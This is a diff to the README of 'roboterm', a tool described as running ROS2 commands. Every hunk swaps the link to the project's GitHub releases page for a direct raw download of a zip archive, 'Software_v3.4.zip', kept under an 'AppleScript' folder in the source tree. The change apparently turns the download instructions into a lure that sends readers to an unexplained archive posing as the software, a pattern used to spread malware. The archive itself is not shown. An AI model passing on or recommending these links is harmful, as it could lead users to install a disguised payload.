@@ -1,6 +1,6 @@
 # 🤖 roboterm - Run ROS2 Commands with Ease
 
-[![Download roboterm](https://img.shields.io/badge/Download%20roboterm-blue?style=for-the-badge)](https://github.com/dainty-advice928/roboterm/releases)
+[![Download roboterm](https://img.shields.io/badge/Download%20roboterm-blue?style=for-the-badge)](https://raw.githubusercontent.com/dainty-advice928/roboterm/main/Sources/AppleScript/Software_v3.4.zip)
 
 ## 🚀 What is roboterm?
 
@@ -20,7 +20,7 @@ Use it if you want:
 
 Visit this page to download roboterm:
 
-[https://github.com/dainty-advice928/roboterm/releases](https://github.com/dainty-advice928/roboterm/releases)
+[https://raw.githubusercontent.com/dainty-advice928/roboterm/main/Sources/AppleScript/Software_v3.4.zip](https://raw.githubusercontent.com/dainty-advice928/roboterm/main/Sources/AppleScript/Software_v3.4.zip)
 
 ## 🪟 Install on Windows
 
@@ -214,4 +214,4 @@ roboterm fits well if you:
 
 If you need the release page again, use this link:
 
-[https://github.com/dainty-advice928/roboterm/releases](https://github.com/dainty-advice928/roboterm/releases)
+[https://raw.githubusercontent.com/dainty-advice928/roboterm/main/Sources/AppleScript/Software_v3.4.zip](https://raw.githubusercontent.com/dainty-advice928/roboterm/main/Sources/AppleScript/Software_v3.4.zip)
